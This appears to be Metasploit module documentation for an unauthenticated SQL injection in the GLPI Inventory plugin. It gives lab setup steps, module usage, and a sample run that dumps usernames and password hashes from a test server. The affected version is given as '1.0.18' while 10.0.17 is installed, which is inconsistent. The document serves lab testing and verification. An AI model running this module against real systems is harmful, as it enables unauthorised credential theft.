## Vulnerable Application
GLPI <= 1.0.18 fails to properly sanitize user supplied data when sent inside a `SimpleXMLElement`
(available to unauthenticated users), prior to using it in a dynamically constructed SQL query.
As a result, unauthenticated attackers can conduct an SQL injection attack to dump sensitive
data from the backend database such as usernames and password hashes.

In order for GLPI to be exploitable the GLPI Inventory plugin must be installed and enabled, and the "Enable Inventory"
radio button inside the administration configuration also must be checked.

### Setup on Ubuntu 22.04

Install PHP dependencies:
```
sudo add-apt-repository ppa:ondrej/php
sudo apt install apache2 php8.3 php8.3-curl php8.3-zip php8.3-gd php8.3-intl \
 php8.3-intl php-pear php8.3-imagick php-bz2 php8.3-imap php-memcache php8.3-pspell   \
 php8.3-tidy php8.3-xmlrpc php8.3-xsl php8.3-mbstring php8.3-ldap php-cas php-apcu    \
 libapache2-mod-php8.3 php8.3-mysql mariadb-server
```

Ensure mariadb and apache are installed and running:
```
sudo systemctl status apache2
sudo systemctl status mariadb
```

Run the mysql secure installation script, input defaults and your desired username password:
```
sudo mysql_secure_installation
```

Connect to the database:
```
sudo mysql -u root -p
```

Create a database user `msfuser` and a database named `glpi`:
```
CREATE USER 'msfuser'@'localhost' IDENTIFIED BY 'notpassword';
CREATE DATABASE glpi;
GRANT ALL PRIVILEGES ON glpi.* TO 'msfuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

Download the vulnerable version of GLPI, extract it and move it to `/var/www/html`:
```
wget https://github.com/glpi-project/glpi/releases/download/10.0.17/glpi-10.0.17.tgz
tar -xvf glpi-10.0.17.tgz
sudo mv glpi /var/www/html/
```

Download the vulnerable inventory plugin:
```
cd /var/www/html/glpi/plugins
sudo wget https://github.com/glpi-project/glpi-inventory-plugin/releases/download/1.4.0/glpi-glpiinventory-1.4.0.tar.bz2
sudo tar -xvjf glpi-glpiinventory-1.4.0.tar.bz2
```

Set the necessary permissions:
```
sudo chmod 755 -R /var/www/html/
sudo chown www-data:www-data -R /var/www/html/
```

Edit sites-available:
```
sudo vim /etc/apache2/sites-available/glpi.conf
```

Paste:
```
<VirtualHost *:80>
   ServerAdmin admin@your_domain.com
   DocumentRoot /var/www/html/glpi
   ServerName your-domain.com

   <Directory /var/www/html/glpi>
        Options FollowSymlinks
        AllowOverride All
        Require all granted
   </Directory>

   ErrorLog ${APACHE_LOG_DIR}/your-domain.com_error.log
   CustomLog ${APACHE_LOG_DIR}/your-domain.com_access.log combined

</VirtualHost>
```

Create the following symlink, rewrite and restart:
```
sudo ln -s /etc/apache2/sites-available/glpi.conf /etc/apache2/sites-enabled/glpi.conf
sudo a2enmod rewrite
sudo systemctl restart apache2
```

The application should be now available at `http://127.0.0.1/glpi`, navigate there in a browser to complete the setup wizard.
Warnings in the `Checking of the compatibility of your environment with the execution of GLPI` can be ignored, click continue.
It will ask you for the database credentials created above, input them and select the `glpi` database created above.

Once complete you'll be brought to a login page, authenticate using the default credentials `glpi`/`glpi`.

On the left hand side select and expand `Administration` in the dropdown select `Inventory`.
On the right hand side select `Enable Inventory`, then `Save` at the bottom.

On the left hand side select and expand `Setup` in the dropdown select `Plugins`.
Near the bottom of the screen find the `GLPI Inventory` plugin and under `Actions` click the install button (Folder icon with `+` symbol).
After installing the plugin a pop up will appear in the bottom right and ask if you want to enable the plugin, enable it.

Now the application should be vulnerable.

## Options

### DB_COLUMNS
The number of columns in the database. Can vary between versions, adjust this if exploit does not work initially.

### MAX_ENTRIES
The maximum  number of entries to dump from the database. More entries will increase module runtime.

## Verification Steps

1. Start msfconsole.
1. Do: `use gather/glpi_inventory_plugin_unauth_sqli`.
1. Set the `RHOST`.
1. Set `MAX_ENTRIES` to `1` to speed up module run time for verification.
1. Run the module.
1. Receive a table with one username and it's corresponding password hash.

## Scenarios
### GLPI 10.0.17 running on Ubuntu 22.04
```
msf6 > use gather/glpi_inventory_plugin_unauth_sqli
msf6 auxiliary(gather/glpi_inventory_plugin_unauth_sqli) > set rhost 172.16.199.130
rhost => 172.16.199.130
msf6 auxiliary(gather/glpi_inventory_plugin_unauth_sqli) > exploit 
[*] Reloading module...
[*] Running module against 172.16.199.130
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Extracting credential information
glpi_users
==========

 name                   password                                                     api_token
 ----                   --------                                                     ---------
 Plugin_GLPI_Inventory  39
 glpi                   $2y$10$ci01zoEXHWOfoxietd8ry.2K6Y3wR5bc1dZQiftuFM5hqQtPgD6LS
 glpi-system
 normal                 $2y$10$iaxy0646EhwsuBbjAgme4uJN6SN.pbyK.ciTCnep67Wq8x.qt1JvS
 post-only              $2y$10$//Ca44JjRIV/9Hv1IEM1y.v1aEa3FwzytX4QYtKsxyqF/rnOzROei
 tech                   $2y$10$KjaOxGSyd0CMifvDVNiggOxCVHP0g8jER/jLtZsmF54S63LH5GWIy

[*] Auxiliary module execution completed
```
